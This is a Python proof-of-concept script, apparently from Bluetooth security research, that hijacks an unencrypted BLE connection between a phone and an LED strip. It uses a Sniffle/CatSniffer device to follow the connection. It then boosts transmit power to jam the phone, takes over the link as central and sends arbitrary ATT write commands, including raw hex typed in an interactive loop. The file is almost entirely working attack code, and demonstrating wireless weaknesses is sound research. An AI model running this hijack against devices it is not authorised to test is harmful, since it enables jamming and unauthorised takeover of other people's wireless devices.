#!/usr/bin/env python3

# Hijack proof-of-concept (PoC) script for COMMAND_HIJACK (0x28)
# Demonstrates connection takeover against an unencrypted BLE peripheral (e.g. LED strip)
#
# Usage:
#   python3 hijack_poc.py -m AA:BB:CC:DD:EE:FF
#   python3 hijack_poc.py -m AA:BB:CC:DD:EE:FF -s /dev/ttyACM0 --handle 0x0003

import argparse, sys, signal, threading
from time import time, sleep

from sniffle.sniffle_hw import SniffleHW, SnifferMode, DebugMessage
from sniffle.sniffer_state import StateMessage, SnifferState
from sniffle.measurements import MeasurementMessage
from sniffle.packet_decoder import PacketMessage, DPacketMessage, DataMessage, \
        LlDataContMessage

hw = None
_stop_recv = threading.Event()

def sigint_handler(sig, frame):
    print("\nInterrupted.")
    _stop_recv.set()
    if hw:
        hw.cancel_recv()
    sys.exit(0)

def parse_mac(mac_str):
    try:
        parts = [int(h, 16) for h in reversed(mac_str.split(":"))]
        if len(parts) != 6:
            raise ValueError
        return parts
    except Exception:
        print("ERROR: MAC must be 6 colon-separated hex bytes (e.g. AA:BB:CC:DD:EE:FF)",
              file=sys.stderr)
        sys.exit(1)

def wait_for_state(target_state, timeout=30):
    """Block until a StateMessage with target_state is received or timeout."""
    deadline = time() + timeout
    while time() < deadline:
        msg = hw.recv_and_decode()
        print_msg(msg)
        if isinstance(msg, StateMessage) and msg.new_state == target_state:
            return True
    return False

def wait_for_stable_timing(n_events=20, timeout=30):
    """Wait until we have tracked N consecutive connection events in DATA state.

    WinOffsetMeasurement is only generated for encrypted connections so it
    never arrives for this unencrypted strip. Instead we count received
    packets - once the firmware has seen N events its nextHopTime is stable
    and the hijack will fire at the right moment.
    """
    count = 0
    deadline = time() + timeout
    while time() < deadline:
        msg = hw.recv_and_decode()
        if isinstance(msg, PacketMessage):
            dpkt = DPacketMessage.decode(msg)
            # count every C->P packet (each one is a new connection event)
            if hasattr(dpkt, 'data_dir') and dpkt.data_dir == 0:
                count += 1
                if count % 5 == 0:
                    print("[*] Tracked %d/%d connection events..." % (count, n_events))
                if count >= n_events:
                    print("[+] Timing stable after %d events." % count)
                    return True
            print_msg(msg)
        elif isinstance(msg, StateMessage):
            print_msg(msg)
            if msg.new_state not in (SnifferState.DATA,):
                print("[!] Unexpected state: %s" % msg.new_state.name)
                return False
        else:
            print_msg(msg)
    print("[!] Timed out waiting for %d events (got %d)." % (n_events, count))
    return False

def print_msg(msg):
    if isinstance(msg, PacketMessage):
        dpkt = DPacketMessage.decode(msg)
        # skip empty data continuations unless you want verbose output
        if isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0:
            return
        print(dpkt, end='\n\n')
    elif isinstance(msg, (StateMessage, MeasurementMessage, DebugMessage)):
        print(msg, end='\n\n')

# Color commands extracted from LED_connection.pcapng (ELK-BLEDOM strip).
# The real app uses ATT Write Command (0x52) to handle 0x000e (vendor 0xfff0
# service), sending 9-byte frames "7e 07 05 03 RR GG BB 10 ef". Handle 0x0003
# was the GAP Device Name, and the 7b..bf framing is a different LED protocol --
# writing those did nothing on this device.
LED_PRESETS = {
    '1': bytes.fromhex('7e070503ff000010ef'), # Red
    '2': bytes.fromhex('7e07050300ff0010ef'), # Green
    '3': bytes.fromhex('7e0705030000ff10ef'), # Blue
    '4': bytes.fromhex('7e070503ffffff10ef'), # White
    'pcap': bytes.fromhex('7e070503006fff10ef'), # verbatim known-good frame from pcap
    'off': bytes.fromhex('7e07050300000010ef'), # RGB=0 (visually off)
}

def build_att_write(handle, value_bytes):
    """Build an ATT Write Command (opcode 0x52, no response)."""
    pdu = bytes([0x52, handle & 0xFF, handle >> 8]) + bytes(value_bytes)
    l2cap = len(pdu).to_bytes(2, 'little') + b'\x04\x00' + pdu
    return l2cap

def _recv_background():
    """Background thread: drain serial port and print all incoming messages.

    Running this thread prevents the serial RX buffer from filling up while
    input() blocks the main thread, and prints incoming PDUs in real time.
    """
    while not _stop_recv.is_set():
        try:
            msg = hw.recv_and_decode()
            if msg is not None:
                print_msg(msg)
        except Exception:
            pass

def interactive_loop(handle):
    """Send ATT writes; background thread drains serial while input() blocks."""
    # Start background receiver BEFORE anything else so the serial port is
    # continuously drained even when input() is blocking the main thread.
    recv_t = threading.Thread(target=_recv_background, daemon=True)
    recv_t.start()

    print()
    print("Hijack successful! You now control the peripheral.")
    print()

    # --- Immediately auto-cycle all 3 presets ---
    # This proves the hijack worked without requiring the user to type anything.
    # Sends 4 writes in ~1 second, well within the 720 ms supervision window
    # between writes (each write resets the peripheral's supervision timer).
    print("[*] Auto-cycling presets to demonstrate control...")
    for k in ('1', '2', '3', '1'):
        pdu = build_att_write(handle, LED_PRESETS[k])
        hw.cmd_transmit(2, pdu)
        print("  [auto %s] -> %s" % (k, LED_PRESETS[k].hex()))
        sleep(0.25)

    print()
    print("Presets (exact bytes from your pcap):")
    for k, v in LED_PRESETS.items():
        print("  %s  ->  %s" % (k, v.hex()))
    print()
    print("Or use 'color RRGGBB' (e.g., 'color FF00FF' for magenta)")
    print("Or paste any raw hex to send as-is (e.g. 7bff07ff000000ffbf)")
    print("Type 'quit' to exit.")
    print()

    while True:
        try:
            cmd = input("> ").strip().lower()
        except EOFError:
            break

        if cmd in ('quit', 'q'):
            break
        elif cmd in LED_PRESETS:
            payload = LED_PRESETS[cmd]
        elif cmd.startswith('color '):
            # ELK-BLEDOM RGB set: 7e 07 05 03 RR GG BB 10 ef (see LED_connection.pcapng)
            try:
                hex_color = cmd.split(' ')[1].strip()
                if len(hex_color) != 6:
                    raise ValueError
                payload = bytes.fromhex('7e070503' + hex_color + '10ef')
            except Exception:
                print("Invalid color format. Use 'color RRGGBB' (e.g. color FF0000)")
                continue
        else:
            # raw hex passthrough - send exactly what was typed
            try:
                payload = bytes.fromhex(cmd.replace(' ', ''))
                if len(payload) == 0:
                    continue
            except ValueError:
                print("Enter a preset key, 'color RRGGBB', or raw hex bytes.")
                continue

        pdu = build_att_write(handle, payload)
        hw.cmd_transmit(2, pdu)
        print("  -> %s" % payload.hex())

    _stop_recv.set()

def main():
    aparse = argparse.ArgumentParser(
            description="Test COMMAND_HIJACK: sniff a BLE connection then take it over")
    aparse.add_argument("-s", "--serport", default=None,
            help="CatSniffer serial port (auto-detected if omitted)")
    aparse.add_argument("-m", "--mac", required=True,
            help="Target peripheral MAC address (e.g. AA:BB:CC:DD:EE:FF)")
    aparse.add_argument("-P", "--public", action="store_true",
            help="MAC is a public address (default: random)")
    aparse.add_argument("--handle", default="0x000e", type=lambda x: int(x, 0),
            help="ATT handle of the LED control characteristic (default: 0x000e)")
    aparse.add_argument("--no-instahop", action="store_true",
            help="Skip waiting for WinOffset sync (hijack fires as soon as DATA state reached)")
    aparse.add_argument("-b", "--baudrate", type=int, default=921600,
            help="Serial port baud rate (default: 921600)")
    args = aparse.parse_args()

    mac = parse_mac(args.mac)

    global hw
    hw = SniffleHW(args.serport, baudrate=args.baudrate)
    signal.signal(signal.SIGINT, sigint_handler)

    # --- Phase 1: sniff for the connection ---
    print("[*] Configuring sniffer...")
    print("[*] Target MAC: %s" % args.mac)

    hw.setup_sniffer(
        mode=SnifferMode.CONN_FOLLOW,
        targ_mac=mac,
        hop3=True,
        rssi_min=-128,
    )
    hw.cmd_instahop(True)
    hw.mark_and_flush()

    print("[*] Waiting for connection to target (connect phone to LED strip now)...")
    if not wait_for_state(SnifferState.DATA, timeout=60):
        print("ERROR: timed out waiting for DATA state.", file=sys.stderr)
        sys.exit(1)

    print("[+] Following connection (DATA state).")

    # --- Phase 2: wait for timing to stabilize ---
    if not args.no_instahop:
        print("[*] Tracking connection events to stabilize timing...")
        print("[*] Keep the phone connected (idle is fine, no need to change colors).")
        wait_for_stable_timing(n_events=20, timeout=30)
    else:
        print("[!] Skipping timing stabilization (--no-instahop set).")

    # --- Phase 3: hijack ---
    # Crank up TX power to overpower the cellphone and force Packet Collisions
    # (Capture Effect: receiver decodes the strongest signal)
    print("[*] Boosting TX power to +5 dBm to jam the phone...")
    hw.cmd_tx_power(5)

    print("[*] Firing cmd_hijack_live()...")
    hw.cmd_hijack_live()

    print("[*] Waiting for CENTRAL state confirmation...")
    if not wait_for_state(SnifferState.CENTRAL, timeout=10):
        print("ERROR: did not reach CENTRAL state.", file=sys.stderr)
        print("  Possible causes:")
        print("  - Firmware not flashed with COMMAND_HIJACK support")
        print("  - Connection dropped before hijack fired")
        print("  - WinOffset not synced (try without --no-instahop)")
        sys.exit(1)

    print("[+] CENTRAL state confirmed. Phone should have lost connection.")

    # --- Phase 3.5: verify connection is alive ---
    print("[*] Verifying link is alive (waiting for peripheral response)...")
    hw.cmd_transmit(2, build_att_write(args.handle, LED_PRESETS['1']))
    link_alive = False
    deadline = time() + 2.0
    while time() < deadline:
        msg = hw.recv_and_decode()
        print_msg(msg)  # print everything, incl. firmware HJ DebugMessages
        if isinstance(msg, PacketMessage):
            dpkt = DPacketMessage.decode(msg)
            # any packet from peripheral (P->C direction) confirms the link is up
            if hasattr(dpkt, 'data_dir') and dpkt.data_dir == 1:
                link_alive = True
                break
            elif isinstance(dpkt, LlDataContMessage):
                link_alive = True
                break

    if link_alive:
        print("[+] Link confirmed alive - peripheral is responding.")
    else:
        print("[!] No response from peripheral in 2s.")
        print("[!] Connection may have timed out during hijack.")
        print("[!] Reconnect phone to LED and run again - WinOffset needs to sync first.")

    # --- Phase 4: interactive control ---
    interactive_loop(args.handle)

    print("[*] Done.")

if __name__ == "__main__":
    main()
